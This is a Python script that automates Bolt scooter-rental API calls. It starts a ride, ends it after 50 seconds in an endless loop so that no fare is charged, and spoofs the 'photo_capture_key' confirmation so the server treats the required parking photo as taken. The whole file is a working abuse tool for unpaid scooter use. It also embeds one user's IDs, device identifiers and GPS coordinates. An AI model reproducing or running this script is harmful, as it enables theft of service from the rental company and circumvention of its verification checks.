import requests
import json
from time import sleep


"""
YOU NEED TO CHANGE THESE VARIABLES
"""
cookie = "INSERT COOKIE HERE"
authorization = "INSERT AUTHORIZATION VALUE HERE e.g. Basic KzQ5MTc2NzA4Njc1MDQ6MUZCRjAwMEYtQkQzRC00RjgwLUE5NUItRUZFODg4RjYzQzVB"
payment_instrument_id = "adyen_paypal\/6216325090316059"

"""
(OPTIONAL) YOU MAY WANT TO CHANGE THESE VARIABLES
"""
user_agent = "Bolt/109764413 CFNetwork/1390 Darwin/22.0.0"

def get_user_input(): #getting the Bolt scooter id needed for activating the specific scooter
    vehicle_handle = input("Please enter the id of your Bolt scooter (Placed under the scannable QR code): ")
    return vehicle_handle

def create_and_start_order(vehicle_handle): #sending out the first POST request which starts the Bolt Scooter and returns the "order_id" needed for the second POST request
    headers = {
        "Host": "germany-rental.taxify.eu",
        "Cookie": cookie,
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Content-Length": "166",
        "Accept-Encoding": "gzip, deflate",
        "Authorization": authorization,
        "User-Agent": user_agent,
        "Accept-Language": "en-GB,en;q=0.9",
        "Cache-Control": "no-cache"
    }


    body = {
        "vehicle_handle" : {
            "value" : vehicle_handle,
            "type" : "uuid",
        },
        "source" : "single_order",
        "payment_instrument_id" : payment_instrument_id
    }

    url = "https://germany-rental.taxify.eu/micromobility/user/ui/order/createAndStart?gps_age=0.4934508800506592&signup_session_id=e17333a3083993252554877ff58328094ffc3e225168026c4ed412a6518e8f47&country=de&lat=50.09257534411632&user_id=90791700&gps_lat=50.09243612776929&version=CI.91.0&device_name=iPhone12,8&gps_lng=8.225763438023886&lng=8.225648382329815&deviceType=iphone&distinct_id=client-90791700&rh_session_id=90791700u1684582741&language=en-GB&gps_accuracy_m=999.485426861614163&deviceId=ABD8E483-E0A1-496F-826E-6E96A2677BA8&device_os_version=iOS16.0&session_id=90791700u1684583212"

    response = requests.post(url, headers=headers, json=body)

    return response


    
def extract_order_id(response): #extracting the "order_id" from the POST response using the response.json.get() function for use in the getactive1 request
    response_json = response.json()
    id_value = response_json.get('data', {}).get('order', {}).get('id')
    return id_value

def getactive1(id_value, vehicle_handle): #sending out the getactive1 request which returns the response that includes the second id which is needed to then terminate the ride
    headers = {
      "Host": "germany-rental.taxify.eu",
      "Cookie": cookie,
      "Accept": "*/*",
      "Content-Type": "application/json",
      "Content-Length": "135",
      "Accept-Encoding": "gzip, deflate",
      "Authorization": authorization,
      "User-Agent": user_agent,
      "Accept-Language": "en-GB,en;q=0.9",
      "Cache-Control": "no-cache"
      }
      
    body = {
            "source" : "single_order",
    "order_id" : id_value,
    "vehicle_handle" : {
      "value" : vehicle_handle,
      "type" : "uuid"
    }
      }

    url = "https://germany-rental.taxify.eu/micromobility/user/ui/order/getActive?gps_lat=50.09243410333883&distinct_id=client-90791700&lng=8.225648382329815&gps_accuracy_m=12.711663815781176&language=en-GB&rh_session_id=90791700u1684582741&session_id=90791700u1684583212&lat=50.09257534411632&gps_age=0.9473705291748047&signup_session_id=e17333a3083993252554877ff58328094ffc3e225168026c4ed412a6518e8f47&user_id=90791700&deviceId=ABD8E483-E0A1-496F-826E-6E96A2677BA8&gps_lng=8.225768676454782&country=de&device_os_version=iOS16.0&device_name=iPhone12,8&version=CI.91.0&deviceType=iphone"
    getactive1response = requests.post(url, headers=headers, json=body)
    return getactive1response

def extract_getactive1_order_id(getactive1response): #extracting the "getactive1_id_value" from the POST response using the response.json.get() function for use in the requests which terminate the ride
    getactive1response_json = getactive1response.json()
    getactive1_id_value = getactive1response_json.get('data', {}).get('order', {}).get('id') #following the standard structure of the response down to the actual id to retrieve it
    return getactive1_id_value

def getactive2(getactive1_id_value):        #sending out a secong getactive request with a slightly different body including the getactive1_id_value for confirmation (NOTE: this request is probably unnecessary and can be removed however I couldnt finish testing and can therefore not confirm this. 
    headers = {                             #REMOVING THIS REQUEST IS AT OWN RISK AND INVOLVES REMOVING THE EXCEPTION HANDLING FOR THE REQUEST IN THE main() FUNCTION
        "Host": "germany-rental.taxify.eu", 
        "Cookie": cookie,
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Content-Length": "58",
        "Accept-Encoding": "gzip, deflate",
        "Authorization": authorization,
        "User-Agent": user_agent,
        "Accept-Language": "en-GB,en;q=0.9",
        "Cache-Control": "no-cache"
    }

    body = {
        "order_id" : getactive1_id_value,
        "source" : "single_order"
    }

    url = "https://germany-rental.taxify.eu/micromobility/user/ui/order/getActive?gps_age=0.25351762771606445&deviceId=ABD8E483-E0A1-496F-826E-6E96A2677BA8&signup_session_id=e17333a3083993252554877ff58328094ffc3e225168026c4ed412a6518e8f47&language=en-GB&rh_session_id=90791700u1684582741&gps_accuracy_m=9.31564208684695&gps_lat=50.09243464096893&session_id=90791700u1684583212&gps_lng=8.225765413064657&distinct_id=client-90791700&lat=50.09257534411632&device_name=iPhone12,8&country=de&version=CI.91.0&user_id=90791700&lng=8.225648382329815&deviceType=iphone&device_os_version=iOS16.0"
    getactive2response = requests.post(url, headers=headers, json=body)
    return getactive2response

def finish1(getactive1_id_value): #sending out the finish1 request which promts Bolt to finish the ride, promtping the photo confirmation response
    headers = {
        "Host": "germany-rental.taxify.eu",
        "Cookie": cookie,
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Content-Length": "97",
        "Accept-Encoding": "gzip, deflate",
        "Authorization": authorization,
        "User-Agent": user_agent,
        "Accept-Language": "en-GB,en;q=0.9",
        "Cache-Control": "no-cache"
    }

    body = {
          "gps_lat" : "50.092434640968932",
          "order_id" : getactive1_id_value,
          "gps_lng" : "8.2257654130646571"
    }
    
    url = "https://germany-rental.taxify.eu/micromobility/user/order/finish?gps_lng=8.225765413064657&user_id=90791700&deviceType=iphone&device_name=iPhone12,8&version=CI.91.0&gps_lat=50.09243464096893&deviceId=ABD8E483-E0A1-496F-826E-6E96A2677BA8&lng=8.225648382329815&distinct_id=client-90791700&country=de&rh_session_id=90791700u1684582741&language=en-GB&signup_session_id=e17333a3083993252554877ff58328094ffc3e225168026c4ed412a6518e8f47&lat=50.09257534411632&session_id=90791700u1684583212&gps_accuracy_m=9.31564208684695&device_os_version=iOS16.0&gps_age=0.7065105438232422"
    finish1response = requests.post(url, headers=headers, json=body)
    return finish1response

def finish2(getactive1_id_value): #sending out the finish2 request which confirms the termiantion of the ride by passing the "photo_capture_key" argument making the servers believe a valid Photo has been taken
    headers = {                   #Note that this makes the sending of a confirmation photo obsolete
        "Host": "germany-rental.taxify.eu",
        "Cookie": cookie,
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Content-Length": "154",
        "Accept-Encoding": "gzip, deflate",
        "Authorization": authorization,
        "User-Agent": user_agent,
        "Accept-Language": "en-GB,en;q=0.9",
        "Cache-Control": "no-cache"
    }

    body = {
          "order_id" : getactive1_id_value,
          "gps_lng" : 8.2257654130646571,
          "gps_lat" : 50.092434640968932,
          "confirmed_view_keys" : [
            "photo_capture_key"
  ]
    }

    url = "https://germany-rental.taxify.eu/micromobility/user/order/finish?gps_accuracy_m=5.62415408026375&gps_age=0.916790246963501&deviceId=ABD8E483-E0A1-496F-826E-6E96A2677BA8&rh_session_id=90791700u1684582741&lng=8.225648382329815&version=CI.91.0&deviceType=iphone&signup_session_id=e17333a3083993252554877ff58328094ffc3e225168026c4ed412a6518e8f47&device_os_version=iOS16.0&distinct_id=client-90791700&user_id=90791700&device_name=iPhone12,8&lat=50.09257534411632&country=de&gps_lat=50.09243464096893&language=en-GB&session_id=90791700u1684583212&gps_lng=8.225765413064657"
    finish2response = requests.post(url, headers=headers, json=body)
    return finish2response

def main():
        vehicle_handle = get_user_input()
        while True:                                 #running a while True Loop which sends out all the requests needed to start the ride and waits for 50 seconds to terminate it again, because the ride duration was under one minute no charge occurs
            response = create_and_start_order(vehicle_handle)
            print(response.text)
            id_value = extract_order_id(response)
            getactive1response = getactive1(id_value, vehicle_handle)
            getactive1_id_value = extract_getactive1_order_id(getactive1response)
            getactive2response = getactive2(getactive1_id_value)
            if response.status_code == 200 and '"message":"OK"' in response.text and getactive1response.status_code == 200 and '"message":"OK"' in getactive1response.text and getactive2response.status_code == 200 and '"message":"OK"' in getactive2response.text:
                print("Your Ride was started!")
            elif response.status_code != 200 or not '"message":"OK"' in response.text:
                print("\nThere was an Error Creating and Starting your ride: \n" + response.text)
                break
            elif getactive1response.status_code != 200 or not '"message":"OK"' in getactive1response.text:
                print("There was an error with the getactive1 request used to obtain the order id WITHOUT ':' \n" +getactive1response.text)
                break
            elif getactive2response.status_code != 200 or not '"message":"OK"' in getactive2response.text:
                print("There was an error with the (probably unnecessary) getactive2 request: \n" +getactive2response.text)

            sleep(50) #after 50 seconds the ride quickly gets terminated 
            finish1response = finish1(getactive1_id_value)
            if finish1response.status_code == 200 and '"message":"OK"' in finish1response.text:
                print("Finish1 request was succesfully sent! Waiting for confirmation...")
            elif finish1response.status_code != 200 or not '"message":"OK"' in finish1response.text:
                print("There was an error with the finish1 request: \n" +finish1response.text)
            
            finish2response = finish2(getactive1_id_value)
            if finish2response.status_code == 200 and '"message":"OK"' in finish2response.text:
                print("Finish2 request was successfully sent! Your ride was terminated!")
            elif finish2response.status_code != 200 or not '"message":"OK"' in finish2response.text:
                print("There was an error with the finish2 confirmation request: \n" +finish2response.text)

            sleep(0.5) #sleeping for 0.5 seconds to prevent the getactive1 request to be sent out before the ride is terminated, terminating the program with the resposne error code "VEHICLE_IN_WRONG_STATE_FOR_THIS_ACTION"
                       #(NOTE: This amount of sleep isnt fixed and can be changed however if going any lower than 0.5 it would be a good idea to includ exception handling as there is a good chance that the program will terminate in said error code)

if __name__ == "__main__":
    main()


    
